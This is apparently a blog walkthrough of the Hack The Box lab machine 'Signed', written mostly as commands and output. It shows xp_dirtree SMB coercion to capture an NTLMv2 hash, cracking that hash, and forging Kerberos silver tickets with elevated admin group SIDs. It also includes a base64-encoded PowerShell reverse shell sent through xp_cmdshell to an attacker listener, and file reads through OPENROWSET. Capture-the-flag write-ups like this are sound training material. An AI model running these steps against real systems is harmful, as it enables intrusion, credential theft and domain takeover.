---
title: Signed — HTB
author: Radeel Ahmad
pubDatetime: 2025-10-12T11:01:00Z
tags:
  - hacking
  - HTB
  - MSSQL
  - NTLM
  - Kerberos
description:
  Hack The Box "Signed" walkthrough — MSSQL access, xp_dirtree SMB coercion to capture and crack an NTLMv2 hash, forging a Kerberos silver ticket with impacket's ticketer.py to enable xp_cmdshell, then forging elevated group SIDs and abusing OPENROWSET to read root's flag.
---

### Signed — HTB

In this article, I will provide a step-by-step guide to solve the Hack The Box machine '**Signed**'.

![](/blog/images/htb/1*3sepONc9ujpwZFiA6bPSvQ.png)

Nmap Scan:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ nmap -sV -sC -A 10.10.11.90
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-1211:01 UTC
Nmap scan report for 10.10.11.90
Host is up (0.43s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 202216.00.1000.00; RTM
| ms-sql-info:
|   10.10.11.90:1433:
|     Version:
|       name: Microsoft SQL Server 2022RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-10-12T11:07:24+00:00; +46s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-12T06:16:50
|_Not valid after:  2055-10-12T06:16:50
| ms-sql-ntlm-info:
|   10.10.11.90:1433:
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_clock-skew: mean: 45s, deviation: 0s, median: 44s

TRACEROUTE (using port 1433/tcp)
HOP RTT       ADDRESS
1   422.77 ms 10.10.14.1
2   422.92 ms 10.10.11.90

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 308.69 seconds
```

Update `etc/hosts`:

```
10.10.11.90 DC01.signed.htb signed.htb
```

We connect to MSSQL.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ impacket-mssqlclient signed.htb/scott:'Sm230#C5NatH'@10.10.11.90
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (scott  guest@master)>
```

We tried to enable **xp_cmdshell**, but we were unable to do so.

> **xp_cmdshell** is a built-in feature in Microsoft SQL Server that allows users to execute operating system commands directly from within SQL queries. For example, it can run commands like `dir`, `ping`, or even PowerShell scripts through SQL Server. Because it can be a security risk (allowing command execution on the server), it's disabled by default and can only be enabled by users with sufficient administrative privileges.

```
SQL (scott  guest@master)> enable_xp_cmdshell
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01): Line 105: User does not have permission to perform this action.
ERROR(DC01): Line 1: You do not have permission to run the RECONFIGURE statement.
```

Check for other Users.

```
SQL (scott  guest@master)> enum_users
UserName             RoleName   LoginName   DefDBName   DefSchemaName       UserID     SID
------------------   --------   ---------   ---------   -------------   ----------   -----
dbo                  db_owner   sa          master      dbo             b'1         '   b'01'

guest                public     NULL        NULL        guest           b'2         '   b'00'

INFORMATION_SCHEMA   public     NULL        NULL        NULL            b'3         '    NULL

sys                  public     NULL        NULL        NULL            b'4         '    NULL
```

We verify the existence and execution permissions of **xp_dirtree**.

> `xp_dirtree` → shows directory structure (folders/files) from SQL Server. We checked in SQL and confirmed that `xp_dirtree` exists and we have permission to run it (`HAS_PERMS_BY_NAME = 1`). This means the SQL Server (using its service account) can make an SMB connection. Now we can start Responder on `tun0` and try to capture the NTLM hash.

```
SQL (scott  guest@master)> SELECT OBJECT_ID('master..xp_dirtree') AS objid;
     objid
----------
-630944181

SQL (scott  guest@master)> SELECT HAS_PERMS_BY_NAME('master..xp_dirtree', 'OBJECT', 'EXECUTE') AS can_execute_xp_dirtree;
can_execute_xp_dirtree
----------------------
                     1
```

We start Responder.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ responder -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0
```

We enumerate the directory tree on a remote SMB share.

```
SQL (scott  guest@master)> xp_dirtree \\10.10.14.50\sfsdafasd
subdirectory   depth   file
------------   -----   ----
```

We got the NTLMv2 Hash of User **mssqlsvc**.

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:139c7321caa0ae6d:DD284A5EB52383751F9F2A9AAB0FC835:010100000000000000149C486B3BDC01DC8625BF612FD1A50000000002000800440039004E00570001001E00570049004E002D005200530035005400300049003600440030005000480004003400570049004E002D00520053003500540030004900360044003000500048002E00440039004E0057002E004C004F00430041004C0003001400440039004E0057002E004C004F00430041004C0005001400440039004E0057002E004C004F00430041004C000700080000149C486B3BDC0106000400020000000800300030000000000000000000000000300000C3AEBCC9263BF4C13325412CB8B040FEC43F13270C10CF7BBFC2F86DA800F1320A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350030000000000000000000
```

We crack the found Hash with John.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt mssqlsvc.hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)
1g 0:00:00:07 DONE (2025-10-12 11:35) 0.1412g/s 634070p/s 634070c/s 634070C/s purcitititya..punociudad
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

> mssqlsvc — purPLE9795!@

We connect to MSSQL as **mssqlsvc**.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ impacket-mssqlclient signed.htb/mssqlsvc:'purPLE9795!@'@10.10.11.90 -windows-auth
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)>
```

We check which users are members of the **sysadmin role**.

> We found that the **sysadmin** server role contains `sa`, `SIGNED\IT`, and several Windows service accounts (`NT SERVICE\SQLWriter`, `NT SERVICE\Winmgmt`, `NT SERVICE\MSSQLSERVER`, `NT SERVICE\SQLSERVERAGENT`). That means each of those accounts has full sysadmin privileges — they can perform any action on the SQL Server.

```
SQL (SIGNED\mssqlsvc  guest@master)> SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id = rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id WHERE r.name = 'sysadmin';

role       member
--------   -------------------------
sysadmin   sa

sysadmin   SIGNED\IT

sysadmin   NT SERVICE\SQLWriter

sysadmin   NT SERVICE\Winmgmt

sysadmin   NT SERVICE\MSSQLSERVER

sysadmin   NT SERVICE\SQLSERVERAGENT
```

We retrieve the current domain name.

```
SQL (SIGNED\mssqlsvc  guest@master)> select DEFAULT_DOMAIN() as mydomain;
mydomain
--------
SIGNED
```

We retrieve the **SID** of the `SIGNED\IT` Group.

```
SQL (SIGNED\mssqlsvc  guest@master)> select SUSER_SID('SIGNED\IT')

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'
```

We convert a hexadecimal SID to its readable string format.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ python3 - <<'PY'
hexs = "0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000"
b = bytes.fromhex(hexs)
rev = b[0]
subc = b[1]
ident = int.from_bytes(b[2:8], "big")
subs = [str(int.from_bytes(b[8+4*i:12+4*i], "little")) for i in range(subc)]
print("S-{}-{}".format(rev, ident) + "".join("-"+s for s in subs))
PY

S-1-5-21-4088429403-1159899800-2753317549-1105
```

We retrieve the **SID** of the `SIGNED\mssqlsvc` user.

```
SQL (SIGNED\mssqlsvc  guest@master)> select SUSER_SID('SIGNED\mssqlsvc')

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'
```

We convert a hexadecimal SID to its readable string format.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ python3 - <<'PY'
hexs = "0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000"
b = bytes.fromhex(hexs)
rev = b[0]
subc = b[1]
ident = int.from_bytes(b[2:8], "big")
subs = [str(int.from_bytes(b[8+4*i:12+4*i], "little")) for i in range(subc)]
print("S-{}-{}".format(rev, ident) + "".join("-"+s for s in subs))
PY

S-1-5-21-4088429403-1159899800-2753317549-1103
```

Calculate the **NTLM Hash** from mssql User password.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ iconv -f ASCII -t UTF-16LE <(printf 'purPLE9795!@') | openssl dgst -md4
MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc
```

We forge a **TGT** for the MSSQL service user using its NT hash.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ python3 ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain signed.htb -spn 'MSSQLSvc/DC01.signed.htb:1433' -groups 1105 -user-id 1103 mssqlsvc

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

We set the Kerberos credential cache to `mssqlsvc.ccache` and connected to the MSSQL server using Kerberos tickets.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ export KRB5CCNAME=mssqlsvc.ccache

┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)>
```

Now we can enable xp_cmdshell.

```
SQL (SIGNED\mssqlsvc  dbo@master)> enable_xp_cmdshell
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
```

**Online - Reverse Shell Generator** — an online reverse shell generator with local storage, URI & Base64 encoding, and an MSFVenom generator.

Rev Shell:

![](/blog/images/htb/1*6h-T1gBb4H2ZcpVEn_sY_g.png)

Start a listener, confirm the feature is enabled, and verify the server can run commands.

Then execute a command on the server via `xp_cmdshell` (we used a base64-encoded PowerShell one-liner).

```
SQL (SIGNED\mssqlsvc  dbo@master)>  xp_cmdshell "whoami"
output
---------------
signed\mssqlsvc

NULL

SQL (SIGNED\mssqlsvc  dbo@master)>  xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAwACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

We got shell as `mssqlsvc`.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.50] from (UNKNOWN) [10.10.11.90] 60806

PS C:\Windows\system32>
PS C:\Windows\system32> type C:\Users\mssqlsvc\Desktop\user.txt
4dbeb521c3c57b**********
```

---

### Privilege Escalation

We retrieve the **SID** of the `SIGNED\Enterprise Admins` and `SIGNED\Domain Admins` Group.

```
SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\Enterprise Admins');

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca407020000'

SQL (SIGNED\mssqlsvc  guest@master)> SELECT SUSER_SID('SIGNED\Domain Admins');

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000'
```

We convert a hexadecimal SID to its readable string format.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ python3 - <<'PY'
hexs = "0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000"
b = bytes.fromhex(hexs)
rev = b[0]
subc = b[1]
ident = int.from_bytes(b[2:8], "big")
subs = [str(int.from_bytes(b[8+4*i:12+4*i], "little")) for i in range(subc)]
print("S-{}-{}".format(rev, ident) + "".join("-"+s for s in subs))
PY
S-1-5-21-4088429403-1159899800-2753317549-512

┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ python3 - <<'PY'
hexs = "0105000000000005150000005b7bb0f398aa2245ad4a1ca407020000"
b = bytes.fromhex(hexs)
rev = b[0]
subc = b[1]
ident = int.from_bytes(b[2:8], "big")
subs = [str(int.from_bytes(b[8+4*i:12+4*i], "little")) for i in range(subc)]
print("S-{}-{}".format(rev, ident) + "".join("-"+s for s in subs))
PY
S-1-5-21-4088429403-1159899800-2753317549-519
```

SSID:

```
Domain Admins (RID 512)
Enterprise Admins (RID 519)
```

- We forge a Kerberos TGT for **mssqlsvc** to present elevated group memberships.
- We set the Kerberos credential cache to **mssqlsvc.ccache**.
- We connect to the MSSQL server using Kerberos tickets.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ python3 ticketer.py -nthash EF699384C3285C54128A3EE1DDB1A0CC -domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' -domain 'SIGNED.HTB' -spn 'MSSQLSvc/DC01.SIGNED.HTB' -groups '512,519,1105' -user-id 1103 mssqlsvc

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for SIGNED.HTB/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache

┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ export KRB5CCNAME=mssqlsvc.ccache

┌──(kali㉿kali)-[~/Desktop/HTB/Signed]
└─$ impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)>
```

- We enable advanced configuration options in SQL Server
- We enable Ad Hoc Distributed Queries to allow OPENROWSET and distributed data access
- We read the Administrator's root.txt via OPENROWSET

```
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
INFO(DC01): Line 196: Configuration option 'Ad Hoc Distributed Queries' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS x;
BulkColumn
---------------------------------------
b'ca3e424d8381e*************\r\n'

SQL (SIGNED\mssqlsvc  dbo@master)>
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
